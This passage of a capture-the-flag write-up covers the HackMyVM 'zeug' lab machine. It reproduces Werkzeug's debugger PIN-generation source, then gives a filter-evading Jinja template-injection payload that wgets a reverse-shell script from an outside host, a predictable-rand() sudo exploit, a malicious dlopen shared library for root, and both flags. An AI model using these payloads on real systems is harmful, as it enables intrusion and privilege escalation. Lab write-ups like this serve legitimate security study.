from .tbtools import render_console_html

if t.TYPE_CHECKING:
    from _typeshed.wsgi import StartResponse
    from _typeshed.wsgi import WSGIApplication
    from _typeshed.wsgi import WSGIEnvironment

# A week
PIN_TIME = 60 * 60 * 24 * 7


def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


_machine_id: str | bytes | None = None


def get_machine_id() -> str | bytes | None:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> str | bytes | None:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
            # subprocess may not be available, e.g. Google App Engine
            # https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)

            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows, use winreg to get the machine guid.
        if sys.platform == "win32":
            import winreg

            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
                ) as rk:
                    guid: str | bytes
                    guid_type: int
                    guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")

                    if guid_type == winreg.REG_SZ:
                        return guid.encode("utf-8")

                    return guid
            except OSError:
                pass

        return None

    _machine_id = _generate()
    return _machine_id


class _ConsoleFrame:
    """Helper class so that we can reuse the frame console code for the
    standalone console.
    """

    def __init__(self, namespace: dict[str, t.Any]):
        self.console = Console(namespace)
        self.id = 0

    def eval(self, code: str) -> t.Any:
        return self.console.eval(code)


def get_pin_and_cookie_name(
    app: WSGIApplication,
) -> tuple[str, str] | tuple[None, None]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: str | None

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name


class DebuggedApplication:
    """Enables debugging support for a given application::

        from werkzeug.debug import DebuggedApplication
        from myapp import app
        app = DebuggedApplication(app, evalex=True)

    The ``evalex`` argument allows evaluating expressions in any frame
    of a traceback. This works by preserving each frame with its local
    state. Some state, such as context globals, cannot be restored with
    the frame by default. When ``evalex`` is enabled,
    ``environ["werkzeug.debug.preserve_context"]`` will be a callable
    that takes a context manager, and can be called multiple times.
    Each context manager will be entered before evaluating code in the
    frame, then exited again, so they can perform setup and cleanup for
    each call.

    :param app: the WSGI application to run debugged.
    :param evalex: enable exception evaluation feature (interactive
                   debugging).  This requires a non-forking server.
    :param request_key: The key that points to the request object in this
                        environment.  This parameter is ignored in current
                        versions.
    :param console_path: the URL for a general purpose console.
    :param console_init_func: the function that is executed before starting
                              the general purpose console.  The return value
                              is used as initial namespace.
    :param show_hidden_frames: by default hidden traceback frames are skipped.
                               You can show them by setting this parameter
                               to `True`.
    :param pin_security: can be used to disable the pin based security system.
    :param pin_logging: enables the logging of the pin system.

    .. versionchanged:: 2.2
        Added the ``werkzeug.debug.preserve_context`` environ key.
    """

    _pin: str
    _pin_cookie: str

    def __init__(
        self,
        app: WSGIApplication,
        evalex: bool = False,
        request_key: str = "werkzeug.request",
        console_path: str = "/console",
        console_init_func: t.Callable[[], dict[str, t.Any]] | None = None,
        show_hidden_frames: bool = False,
        pin_security: bool = True,
        pin_logging: bool = True,
    ) -> None:
        if not console_init_func:
            console_init_func = None
        self.app = app
        self.evalex = evalex
        self.frames: dict[int, DebugFrameSummary | _ConsoleFrame] = {}
        self.frame_contexts: dict[int, list[t.ContextManager[None]]] = {}
        self.request_key = request_key
        self.console_path = console_path
        self.console_init_func = console_init_func
        self.show_hidden_frames = show_hidden_frames
        self.secret = gen_salt(20)
        self._failed_pin_auth = 0

        self.pin_logging = pin_logging
        if pin_security:
            # Print out the pin for the debugger on standard out.
            if os.environ.get("WERKZEUG_RUN_MAIN") == "true" and pin_logging:
                _log("warning", "* Debugger is active!")
                if self.pin is None:
                    _log("warning", "* Debugger PIN disabled. DEBUGGER UNSECURED!")
                else:
                    _log("info", "* Debugger PIN: %s", self.pin)
        else:
            self.pin = None

    @property
    def pin(self) -> str | None:
        if not hasattr(self, "_pin"):
            pin_cookie = get_pin_and_cookie_name(self.app)
            self._pin, self._pin_cookie = pin_cookie  # type: ignore
        return self._pin

    @pin.setter
    def pin(self, value: str) -> None:
        self._pin = value

    @property
    def pin_cookie_name(self) -> str:
        """The name of the pin cookie."""
        if not hasattr(self, "_pin_cookie"):
            pin_cookie = get_pin_and_cookie_name(self.app)
            self._pin, self._pin_cookie = pin_cookie  # type: ignore
        return self._pin_cookie

    def debug_application(
        self, environ: WSGIEnvironment, start_response: StartResponse
    ) -> t.Iterator[bytes]:
        """Run the application and conserve the traceback frames."""
        contexts: list[t.ContextManager[t.Any]] = []

        if self.evalex:
            environ["werkzeug.debug.preserve_context"] = contexts.append

        app_iter = None
        try:
            app_iter = self.app(environ, start_response)
            yield from app_iter
            if hasattr(app_iter, "close"):
                app_iter.close()
        except Exception as e:
            if hasattr(app_iter, "close"):
                app_iter.close()  # type: ignore

            tb = DebugTraceback(e, skip=1, hide=not self.show_hidden_frames)

            for frame in tb.all_frames:
                self.frames[id(frame)] = frame
                self.frame_contexts[id(frame)] = contexts

            is_trusted = bool(self.check_pin_trust(environ))
            html = tb.render_debugger_html(
                evalex=self.evalex,
                secret=self.secret,
                evalex_trusted=is_trusted,
            )
            response = Response(html, status=500, mimetype="text/html")

            try:
                yield from response(environ, start_response)
            except Exception:
                # if we end up here there has been output but an error
                # occurred.  in that situation we can do nothing fancy any
                # more, better log something into the error log and fall
                # back gracefully.
                environ["wsgi.errors"].write(
                    "Debugging middleware caught exception in streamed"
                    "response at a point where response headers were already"
                    "sent.\n"
                )

            environ["wsgi.errors"].write("".join(tb.render_traceback_text()))

    def execute_command(# type: ignore[return]
        self,
        request: Request,
        command: str,
        frame: DebugFrameSummary | _ConsoleFrame,
    ) -> Response:
        """Execute a command in a console."""
        contexts = self.frame_contexts.get(id(frame), [])

        with ExitStack() as exit_stack:
            for cm in contexts:
                exit_stack.enter_context(cm)

            return Response(frame.eval(command), mimetype="text/html")

    def display_console(self, request: Request) -> Response:
        """Display a standalone shell."""
        if 0 not in self.frames:
            if self.console_init_func is None:
                ns = {}
            else:
                ns = dict(self.console_init_func())
            ns.setdefault("app", self.app)
            self.frames[0] = _ConsoleFrame(ns)
        is_trusted = bool(self.check_pin_trust(request.environ))
        return Response(
            render_console_html(secret=self.secret, evalex_trusted=is_trusted),
            mimetype="text/html",
        )

    def get_resource(self, request: Request, filename: str) -> Response:
        """Return a static resource from the shared folder."""
        path = join("shared", basename(filename))

        try:
            data = pkgutil.get_data(__package__, path)
        except OSError:
            return NotFound()  # type: ignore[return-value]
        else:
            if data is None:
                return NotFound()  # type: ignore[return-value]

            etag = str(adler32(data) & 0xFFFFFFFF)
            return send_file(
                BytesIO(data), request.environ, download_name=filename, etag=etag
            )

    def check_pin_trust(self, environ: WSGIEnvironment) -> bool | None:
        """Checks if the request passed the pin test.  This returns `True` if the
        request is trusted on a pin/cookie basis and returns `False` if not.
        Additionally if the cookie's stored pin hash is wrong it will return
        `None` so that appropriate action can be taken.
        """
        if self.pin is None:
            return True
        val = parse_cookie(environ).get(self.pin_cookie_name)
        if not val or "|" not in val:
            return False
        ts_str, pin_hash = val.split("|", 1)

        try:
            ts = int(ts_str)
        except ValueError:
            return False

        if pin_hash != hash_pin(self.pin):
            return None
        return (time.time() - PIN_TIME) < ts

    def _fail_pin_auth(self) -> None:
        time.sleep(5.0 if self._failed_pin_auth> 5 else 0.5)
        self._failed_pin_auth += 1

    def pin_auth(self, request: Request) -> Response:
        """Authenticates with the pin."""
        exhausted = False
        auth = False
        trust = self.check_pin_trust(request.environ)
        pin = t.cast(str, self.pin)

        # If the trust return value is `None` it means that the cookie is
        # set but the stored pin hash value is bad.  This means that the
        # pin was changed.  In this case we count a bad auth and unset the
        # cookie.  This way it becomes harder to guess the cookie name
        # instead of the pin as we still count up failures.
        bad_cookie = False
        if trust is None:
            self._fail_pin_auth()
            bad_cookie = True

        # If we're trusted, we're authenticated.
        elif trust:
            auth = True

        # If we failed too many times, then we're locked out.
        elif self._failed_pin_auth > 10:
            exhausted = True

        # Otherwise go through pin based authentication
        else:
            entered_pin = request.args["pin"]

            if entered_pin.strip().replace("-", "") == pin.replace("-",""):
                self._failed_pin_auth = 0
                auth = True
            else:
                self._fail_pin_auth()

        rv = Response(
            json.dumps({"auth": auth, "exhausted": exhausted}),
            mimetype="application/json",
        )
        if auth:
            rv.set_cookie(
                self.pin_cookie_name,
                f"{int(time.time())}|{hash_pin(pin)}",
                httponly=True,
                samesite="Strict",
                secure=request.is_secure,
            )
        elif bad_cookie:
            rv.delete_cookie(self.pin_cookie_name)
        return rv

    def log_pin_request(self) -> Response:
        """Log the pin if needed."""
        if self.pin_logging and self.pin is not None:
            _log(
                "info", "* To enable the debugger you need to enter the security pin:"
            )
            _log("info", "* Debugger pin code: %s", self.pin)
        return Response("")

    def __call__(
        self, environ: WSGIEnvironment, start_response: StartResponse
    ) -> t.Iterable[bytes]:
        """Dispatch the requests."""
        # important: don't ever access a function here that reads the incoming
        # form data!  Otherwise the application won't have access to that data
        # any more!
        request = Request(environ)
        response = self.debug_application
        if request.args.get("__debugger__") == "yes":
            cmd = request.args.get("cmd")
            arg = request.args.get("f")
            secret = request.args.get("s")
            frame = self.frames.get(request.args.get("frm", type=int))  # type: ignore
            if cmd == "resource" and arg:
                response = self.get_resource(request, arg)  # type: ignore
            elif cmd == "pinauth" and secret == self.secret:
                response = self.pin_auth(request)  # type: ignore
            elif cmd == "printpin" and secret == self.secret:
                response = self.log_pin_request()  # type: ignore
            elif (
                self.evalex
                and cmd is not None
                and frame is not None
                and self.secret == secret
                and self.check_pin_trust(environ)
            ):
                response = self.execute_command(request, cmd, frame)  # type: ignore
        elif (
            self.evalex
            and self.console_path is not None
            and request.path == self.console_path
        ):
            response = self.display_console(request)  # type: ignore
        return response(environ, start_response)

```

</details>

### 直接利用 popen 构建命令执行反弹 shell

```plaintext title=""
{{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"wget 192.168.56.102/reverse.sh -o /home/co"+"sette/reverse.sh\").read()")}}

```

## User - cosette

```plaintext title="ls -lah"
lrwxrwxrwx 1 cosette cosette    9 Jan  6 23:22 .bash_history -> /dev/null
-rwx------ 1 cosette cosette  220 Apr 23  2023 .bash_logout
-rwx------ 1 cosette cosette 3.5K Apr 23  2023 .bashrc
drwx------ 3 cosette cosette 4.0K Jan  6 16:19 .local
-rwx------ 1 cosette cosette  807 Apr 23  2023 .profile
-rwx------ 1 cosette cosette  16K Jan  7 13:13 seed_bak
drwx------ 6 cosette cosette 4.0K Feb  6 02:52 zeug
```

将 seed_bak 进行反编译，得到

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    int v4; // [rsp+Ch] [rbp-14h] BYREF
    int v5; // [rsp+10h] [rbp-10h]
    int v6; // [rsp+14h] [rbp-Ch]
    unsigned __int64 v7; // [rsp+18h] [rbp-8h]

    v7 = __readfsqword(0x28u);
    banner(argc, argv, envp);
    srand(1u);
    v5 = rand();
    v6 = -559038737;
    v4 = 0;
    printf("Enter a number:");
    __isoc99_scanf("%d", &v4);
    if (v6 == (v5 ^ v4) )
    system("/bin/bash");
    else
    puts("Wrong.");
    return 0;
}
```

### 伪随机攻击

简单编写一个伪随机的计算脚本

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    int v5; // [rsp+10h] [rbp-10h]
    srand(1u);
    v5 = rand();
    int v6 = -559038737;
    printf("%d\n", v5 ^ v6);
    return 0;
}
// -1255736440
```

```shell title="Exploit it"
(remote) cosette@zeug:/home/cosette$ sudo -l
Matching Defaults entries for cosette on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cosette may run the following commands on zeug:
    (exia) NOPASSWD: /home/exia/seed
(remote) cosette@zeug:/home/cosette$ sudo -u exia /home/exia/seed
********************************************
* Hi, Cosette, it's time to plant the seed *
********************************************
Enter a number: -1255736440
exia@zeug:/home/cosette$ whoami
exia
```

## User - exia

### flag - user

```plaintext
exia@zeug:~$ cat user.txt
HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}
```

### 动态库执行代码注入

```plaintext title="sudo -l"
Matching Defaults entries for exia on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User exia may run the following commands on zeug:
    (root) NOPASSWD: /usr/bin/zeug
```

反编译 zeug 程序，得到

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    if (dlopen("/home/exia/exia.so", 2) )
    return 0;
    fwrite("Error opening file\n", 1uLL, 0x13uLL, _bss_start);
    return 1;
}
```

可以猜测是要借助 dlopen 加载依赖库实现代码注入

```c title="exia.c"
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void init()
{
    puts("Hello dynamic linkage world!");
    system("/bin/bash");
}
```

```shell title="Exploit it"
(remote) exia@zeug:/home/exia$ gcc -shared -fPIC -o exia.so exia.c
(remote) exia@zeug:/home/exia$ sudo -u root /usr/bin/zeug
Hello dynamic linkage world!
root@zeug:/home/exia# whoami
root
```

## User - root

### flag - root

```shell
root@zeug:~# cat root.txt 
HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
```
